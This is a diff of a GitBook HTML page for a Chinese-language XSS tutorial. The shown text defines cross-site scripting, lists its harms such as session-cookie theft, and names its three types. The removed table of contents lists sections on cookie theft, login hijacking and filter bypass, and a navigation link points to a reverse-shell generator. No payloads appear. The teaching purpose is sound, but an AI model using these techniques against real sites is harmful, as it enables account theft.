@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>02.XSS · d4m1ts 知识库</title>
+        <title>02.XSS · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -17,7 +17,15 @@
     
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-plus/search.css">
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.css">
                 
             
                 
@@ -29,14 +37,6 @@
                 
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-page-treeview/style.css">
-                
-            
-                
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                 
             
@@ -45,27 +45,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
-                
-            
-                
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-pageview-count/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-insert-logo/plugin.css">
                 
             
                 
@@ -74,6 +54,10 @@
             
                 
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
                 
             
                 
@@ -88,6 +72,10 @@
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-theme-d4t/style.css">
+                
+            
         
 
     
@@ -107,7 +95,6 @@
     
 
         
-    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -124,37 +111,38 @@
     <link rel="prev" href="../01.SQL注入/09.工具Sqlmap/tamper.html" />
     
 
-    
-        <link rel="shortcut icon" href='../../../../README.assets/favicon.ico' type="image/x-icon">
-    
-    
-        <link rel="bookmark" href='../../../../README.assets/favicon.ico' type="image/x-icon">
-    
-    
-        <link rel="apple-touch-icon" href='../../../../README.assets/favicon.ico'>
-    
-    
-        
-        <link rel="apple-touch-icon" sizes="120x120" href="../../../../README.assets/favicon.ico">
-        
-        <link rel="apple-touch-icon" sizes="180x180" href="../../../../README.assets/favicon.ico">
-        
-    
-
     </head>
     <body>
         
 <div class="book">
-    <div class="book-summary">
+    <div class="header-inner">
+        <!-- LOGO -->
+        <div class="logo"></div>
+        <span class="title"></span>
+
+        <!-- Search -->
         
-            
 <div id="book-search-input" role="search">
     <input type="text" placeholder="Type to search" />
 </div>
 
+
+        <!-- Nav -->
+        <ul class="header-nav">
+            <li>
+                <a href="https://markdown.gm7.org/" target="_blank">markdown在线</a>
+            </li><li>
+                <a href="https://rshell.gm7.org/" target="_blank">Reverse Shell Generator</a>
+            </li>
+        </ul>
+    </div>
+
+    <div class="book-summary">
+        <div class="sidebar-nav-space"></div>
+        
+        
+        <nav role="navigation">
             
-                <nav role="navigation">
-                
 
 
 <ul class="summary">
@@ -4711,16 +4699,24 @@
 </ul>
 
 
-                </nav>
-            
+        </nav>
         
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
     </div>
 
     <div class="book-body">
         
-            <div class="body-inner">
-                
-                    
+        <div class="body-inner">
+            
+            
 
 <div class="book-header" role="navigation">
     
@@ -4735,91 +4731,15 @@
 
 
 
-                    <div class="page-wrapper" tabindex="-1" role="main">
-                        <div class="page-inner">
-                            
-<div class="search-plus" id="book-search-results">
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
     <div class="search-noresults">
     
-                                <section class="normal markdown-section">
-                                
-                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#&#x5B9A;&#x4E49;"><b>1.1. </b>&#x5B9A;&#x4E49;</a></li><li><span class="title-icon "></span><a href="#&#x5371;&#x5BB3;"><b>1.2. </b>&#x5371;&#x5BB3;</a></li><li><span class="title-icon "></span><a href="#xss&#x5206;&#x7C7B;"><b>1.3. </b>XSS&#x5206;&#x7C7B;</a></li><ul><li><span class="title-icon "></span><a href="#&#x53CD;&#x5C04;&#x578B;xss"><b>1.3.1. </b>&#x53CD;&#x5C04;&#x578B;XSS</a></li><li><span class="title-icon "></span><a href="#&#x5B58;&#x50A8;&#x578B;xss"><b>1.3.2. </b>&#x5B58;&#x50A8;&#x578B;XSS</a></li><li><span class="title-icon "></span><a href="#dom&#x578B;xss"><b>1.3.3. </b>DOM&#x578B;XSS</a></li></ul><li><span class="title-icon "></span><a href="#&#x5404;xss&#x533A;&#x522B;"><b>1.4. </b>&#x5404;XSS&#x533A;&#x522B;</a></li><ul><li><span class="title-icon "></span><a href="#&#x57FA;&#x7840;&#x5BF9;&#x6BD4;"><b>1.4.1. </b>&#x57FA;&#x7840;&#x5BF9;&#x6BD4;</a></li><li><span class="title-icon "></span><a href="#&#x53CD;&#x5C04;&#x578B;xss&#x4E0E;dom&#x578B;xss&#x533A;&#x522B;"><b>1.4.2. </b>&#x53CD;&#x5C04;&#x578B;XSS&#x4E0E;DOM&#x578B;XSS&#x533A;&#x522B;</a></li><li><span class="title-icon "></span><a href="#xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;"><b>1.4.3. </b>XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;</a></li></ul><li><span class="title-icon "></span><a href="#xss&#x6316;&#x6398;"><b>1.5. </b>XSS&#x6316;&#x6398;</a></li><ul><li><span class="title-icon "></span><a href="#&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;"><b>1.5.1. </b>&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</a></li><li><span class="title-icon "></span><a href="#&#x767D;&#x76D2;&#x6D4B;&#x8BD5;"><b>1.5.2. </b>&#x767D;&#x76D2;&#x6D4B;&#x8BD5;</a></li><li><span class="title-icon "></span><a href="#&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;"><b>1.5.3. </b>&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</a></li></ul><li><span class="title-icon "></span><a href="#&#x5E38;&#x89C1;payload"><b>1.6. </b>&#x5E38;&#x89C1;Payload</a></li><ul><li><span class="title-icon "></span><a href="#&#x901F;&#x67E5;&#x8868;"><b>1.6.1. </b>&#x901F;&#x67E5;&#x8868;</a></li><li><span class="title-icon "></span><a href="#&#x63A2;&#x6D4B;&#x5668;"><b>1.6.2. </b>&#x63A2;&#x6D4B;&#x5668;</a></li><li><span class="title-icon "></span><a href="#&#x5E38;&#x7528;&#x57FA;&#x7840;payload"><b>1.6.3. </b>&#x5E38;&#x7528;&#x57FA;&#x7840;payload</a></li><li><span class="title-icon "></span><a href="#&#x83B7;&#x53D6;cookie&#x624B;&#x6CD5;"><b>1.6.4. </b>&#x83B7;&#x53D6;Cookie&#x624B;&#x6CD5;</a></li><li><span class="title-icon "></span><a href="#&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;"><b>1.6.5. </b>&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;</a></li><li><span class="title-icon "></span><a href="#&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;"><b>1.6.6. </b>&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;</a></li><li><span class="title-icon "></span><a href="#&#x7ED5;&#x8FC7;"><b>1.6.7. </b>&#x7ED5;&#x8FC7;</a></li></ul><li><span class="title-icon "></span><a href="#&#x5E38;&#x89C4;&#x9632;&#x5FA1;"><b>1.7. </b>&#x5E38;&#x89C4;&#x9632;&#x5FA1;</a></li><ul><li><span class="title-icon "></span><a href="#&#x8F93;&#x5165;&#x68C0;&#x67E5;"><b>1.7.1. </b>&#x8F93;&#x5165;&#x68C0;&#x67E5;</a></li><li><span class="title-icon "></span><a href="#&#x8F93;&#x51FA;&#x7F16;&#x7801;"><b>1.7.2. </b>&#x8F93;&#x51FA;&#x7F16;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x4F7F;&#x7528;httponly"><b>1.7.3. </b>&#x4F7F;&#x7528;httponly</a></li><li><span class="title-icon "></span><a href="#&#x4F7F;&#x7528;csp"><b>1.7.4. </b>&#x4F7F;&#x7528;CSP</a></li></ul><li><span class="title-icon "></span><a href="#&#x7279;&#x6B8A;&#x9632;&#x5FA1;"><b>1.8. </b>&#x7279;&#x6B8A;&#x9632;&#x5FA1;</a></li><ul><li><span class="title-icon "></span><a href="#&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;xss&#x4FEE;&#x590D;"><b>1.8.1. </b>&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;XSS&#x4FEE;&#x590D;</a></li><li><span class="title-icon "></span><a href="#url&#x53EF;&#x63A7;"><b>1.8.2. </b>URL&#x53EF;&#x63A7;</a></li><li><span class="title-icon "></span><a href="#jsonp"><b>1.8.3. </b>JSONP</a></li></ul></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><ul>
-<li><div><a href="#&#x5B9A;&#x4E49;">&#x5B9A;&#x4E49;</a><i></i></div></li>
-<li><div><a href="#&#x5371;&#x5BB3;">&#x5371;&#x5BB3;</a><i></i></div></li>
-<li><div><a href="#xss&#x5206;&#x7C7B;">XSS&#x5206;&#x7C7B;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x53CD;&#x5C04;&#x578B;xss">&#x53CD;&#x5C04;&#x578B;XSS</a><i></i></div></li>
-<li><div><a href="#&#x5B58;&#x50A8;&#x578B;xss">&#x5B58;&#x50A8;&#x578B;XSS</a><i></i></div></li>
-<li><div><a href="#dom&#x578B;xss">DOM&#x578B;XSS</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#&#x5404;xss&#x533A;&#x522B;">&#x5404;XSS&#x533A;&#x522B;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x57FA;&#x7840;&#x5BF9;&#x6BD4;">&#x57FA;&#x7840;&#x5BF9;&#x6BD4;</a><i></i></div></li>
-<li><div><a href="#&#x53CD;&#x5C04;&#x578B;xss&#x4E0E;dom&#x578B;xss&#x533A;&#x522B;">&#x53CD;&#x5C04;&#x578B;XSS&#x4E0E;DOM&#x578B;XSS&#x533A;&#x522B;</a><i></i></div></li>
-<li><div><a href="#xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;">XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#xss&#x6316;&#x6398;">XSS&#x6316;&#x6398;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;">&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</a><i></i></div></li>
-<li><div><a href="#&#x767D;&#x76D2;&#x6D4B;&#x8BD5;">&#x767D;&#x76D2;&#x6D4B;&#x8BD5;</a><i></i></div></li>
-<li><div><a href="#&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;">&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#&#x5E38;&#x89C1;payload">&#x5E38;&#x89C1;Payload</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x901F;&#x67E5;&#x8868;">&#x901F;&#x67E5;&#x8868;</a><i></i></div></li>
-<li><div><a href="#&#x63A2;&#x6D4B;&#x5668;">&#x63A2;&#x6D4B;&#x5668;</a><i></i></div></li>
-<li><div><a href="#&#x5E38;&#x7528;&#x57FA;&#x7840;payload">&#x5E38;&#x7528;&#x57FA;&#x7840;payload</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x57FA;&#x4E8E;&#x6807;&#x7B7E;">&#x57FA;&#x4E8E;&#x6807;&#x7B7E;</a><i></i></div></li>
-<li><div><a href="#&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;">&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;</a><i></i></div></li>
-<li><div><a href="#&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;">&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;</a><i></i></div></li>
-<li><div><a href="#markdown-xss">MarkDown XSS</a><i></i></div></li>
-<li><div><a href="#xml-xss">XML XSS</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#&#x83B7;&#x53D6;cookie&#x624B;&#x6CD5;">&#x83B7;&#x53D6;Cookie&#x624B;&#x6CD5;</a><i></i></div></li>
-<li><div><a href="#&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;">&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;">&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;</a><i></i></div></li>
-<li><div><a href="#&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action">&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action</a><i></i></div></li>
-<li><div><a href="#&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;">&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;</a><i></i></div></li>
-<li><div><a href="#&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;">&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;">&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;">&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;</a><i></i></div></li>
-<li><div><a href="#&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;">&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;">&#x7ED5;&#x8FC7;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x5E38;&#x89C4;&#x624B;&#x6CD5;">&#x5E38;&#x89C4;&#x624B;&#x6CD5;</a><i></i></div></li>
-<li><div><a href="#&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;">&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;</a><i></i></div></li>
-<li><div><a href="#&#x901A;&#x8FC7;eval&#x51FD;&#x6570;">&#x901A;&#x8FC7;eval&#x51FD;&#x6570;</a><i></i></div></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;lt&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&lt;&#x8FC7;&#x6EE4;</a><i></i></div></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;</a><i></i></div></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;</a><i></i></div></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;</a><i></i></div></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;()&#x8FC7;&#x6EE4;</a><i></i></div></li>
-<li><div><a href="#&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;">&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;</a><i></i></div></li>
-<li><div><a href="#&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;">&#x5229;&#x7528;JS&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;</a><i></i></div></li>
-</ul></li>
-</ul></li>
-<li><div><a href="#&#x5E38;&#x89C4;&#x9632;&#x5FA1;">&#x5E38;&#x89C4;&#x9632;&#x5FA1;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x8F93;&#x5165;&#x68C0;&#x67E5;">&#x8F93;&#x5165;&#x68C0;&#x67E5;</a><i></i></div></li>
-<li><div><a href="#&#x8F93;&#x51FA;&#x7F16;&#x7801;">&#x8F93;&#x51FA;&#x7F16;&#x7801;</a><i></i></div></li>
-<li><div><a href="#&#x4F7F;&#x7528;httponly">&#x4F7F;&#x7528;httponly</a><i></i></div></li>
-<li><div><a href="#&#x4F7F;&#x7528;csp">&#x4F7F;&#x7528;CSP</a><i></i></div></li>
-</ul></li>
-<li><div><a href="#&#x7279;&#x6B8A;&#x9632;&#x5FA1;">&#x7279;&#x6B8A;&#x9632;&#x5FA1;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
-<ul>
-<li><div><a href="#&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;xss&#x4FEE;&#x590D;">&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;XSS&#x4FEE;&#x590D;</a><i></i></div></li>
-<li><div><a href="#url&#x53EF;&#x63A7;">URL&#x53EF;&#x63A7;</a><i></i></div></li>
-<li><div><a href="#jsonp">JSONP</a><i></i></div></li>
-</ul></li>
-</ul>
-</div>
-
-<h2 id="&#x5B9A;&#x4E49;"><a name="&#x5B9A;&#x4E49;" class="anchor-navigation-ex-anchor" href="#&#x5B9A;&#x4E49;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x5B9A;&#x4E49;</h2>
+                    <section class="normal markdown-section">
+                        
+                        <h2 id="&#x5B9A;&#x4E49;">&#x5B9A;&#x4E49;</h2>
 <p><strong>&#x8DE8;&#x7AD9;&#x811A;&#x672C;</strong>&#xFF08;&#x82F1;&#x8BED;&#xFF1A;<code>Cross-site scripting</code>&#xFF0C;&#x901A;&#x5E38;&#x7B80;&#x79F0;&#x4E3A;&#xFF1A;XSS&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x7F51;&#x7AD9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#xFF0C;<strong>&#x662F;&#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x7684;&#x4E00;&#x79CD;</strong>&#x3002;&#x5B83;&#x5141;&#x8BB8;&#x653B;&#x51FB;&#x8005;&#x5C06;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x5230;&#x524D;&#x7AEF;&#x7F51;&#x9875;&#x4E0A;&#xFF0C;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x5728;&#x6D4F;&#x89C8;&#x7F51;&#x9875;&#x65F6;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x800C;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x3002;</p>
 <blockquote>
 <p>[!NOTE]</p>
@@ -4832,7 +4752,7 @@
 <p>[!NOTE]</p>
 <p>&#x591A;&#x8BF4;&#x4E00;&#x53E5;&#xFF0C;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x5BF9;&#x670D;&#x52A1;&#x7AEF;&#x4E0D;&#x4F1A;&#x9020;&#x6210;&#x5F71;&#x54CD;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x5F71;&#x54CD;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5F71;&#x54CD;&#x7528;&#x6237;&#x7684;&#x6F0F;&#x6D1E;</p>
 </blockquote>
-<h2 id="&#x5371;&#x5BB3;"><a name="&#x5371;&#x5BB3;" class="anchor-navigation-ex-anchor" href="#&#x5371;&#x5BB3;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x5371;&#x5BB3;</h2>
+<h2 id="&#x5371;&#x5BB3;">&#x5371;&#x5BB3;</h2>
 <ol>
 <li>&#x76D7;&#x53D6;&#x8EAB;&#x4EFD;&#x4FE1;&#x606F;&#xFF0C;&#x7A83;&#x53D6;&#x4F1A;&#x8BDD;Cookie&#x4ECE;&#x800C;&#x7A83;&#x53D6;&#x7F51;&#x7AD9;&#x7528;&#x6237;&#x9690;&#x79C1;&#x3001;&#x5305;&#x62EC;&#x8D26;&#x6237;&#x3001;&#x6D4F;&#x89C8;&#x5386;&#x53F2;&#x3001;IP&#x7B49;</li>
 <li>&#x672A;&#x6388;&#x6743;&#x64CD;&#x4F5C;&#xFF0C;&#x901A;&#x8FC7;JS&#x53D1;&#x8D77;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#x8BF7;&#x6C42;</li>
@@ -4849,7 +4769,7 @@
 </ol>
 <p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x5C31;&#x662F;&#x6240;&#x6709;js&#x80FD;&#x505A;&#x5230;&#x7684;&#x4E8B;&#xFF0C;&#x5B83;&#x90FD;&#x80FD;&#x505A;&#x5230;</p>
 </blockquote>
-<h2 id="xss&#x5206;&#x7C7B;"><a name="xss&#x5206;&#x7C7B;" class="anchor-navigation-ex-anchor" href="#xss&#x5206;&#x7C7B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. XSS&#x5206;&#x7C7B;</h2>
+<h2 id="xss&#x5206;&#x7C7B;">XSS&#x5206;&#x7C7B;</h2>
 <p>XSS&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF1A;</p>
 <ul>
 <li>&#x53CD;&#x5C04;&#x578B;XSS</li>
@@ -4857,7 +4777,7 @@
 <li>DOM&#x578B;XSS</li>
 </ul>
 <p>&#x5176;&#x4E2D;&#x53CD;&#x5C04;&#x578B;&#x3001;DOM-based&#x578B;&#x53EF;&#x4EE5;&#x5F52;&#x7C7B;&#x4E3A;&#x975E;&#x6301;&#x4E45;&#x578B;XSS&#x653B;&#x51FB;&#xFF0C;&#x5B58;&#x50A8;&#x578B;&#x5F52;&#x7C7B;&#x4E3A;&#x6301;&#x4E45;&#x578B;XSS&#x653B;&#x51FB;</p>
-<h3 id="&#x53CD;&#x5C04;&#x578B;xss"><a name="&#x53CD;&#x5C04;&#x578B;xss" class="anchor-navigation-ex-anchor" href="#&#x53CD;&#x5C04;&#x578B;xss"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.1. &#x53CD;&#x5C04;&#x578B;XSS</h3>
+<h3 id="&#x53CD;&#x5C04;&#x578B;xss">&#x53CD;&#x5C04;&#x578B;XSS</h3>
 <blockquote>
 <p>[!NOTE]</p>
 <p>payload&#x4E0D;&#x4F1A;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x4E00;&#x822C;&#x51FA;&#x73B0;&#x5728;&#x67E5;&#x8BE2;&#x9875;&#x9762;&#xFF08;&#x8F93;&#x5165;&#x5185;&#x5BB9;&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x7684;&#x53C2;&#x6570;&#x90FD;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x53CD;&#x5C04;&#x578B;XSS&#xFF09;</p>
@@ -4865,7 +4785,7 @@
 <p>&#x53CD;&#x5C04;&#x578B;XSS&#xFF0C;&#x53C8;&#x79F0;&#x975E;&#x6301;&#x4E45;&#x578B;XSS&#xFF0C;&#x653B;&#x51FB;&#x76F8;&#x5BF9;&#x4E8E;&#x53D7;&#x5BB3;&#x8005;&#x800C;&#x8A00;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x7684;</p>
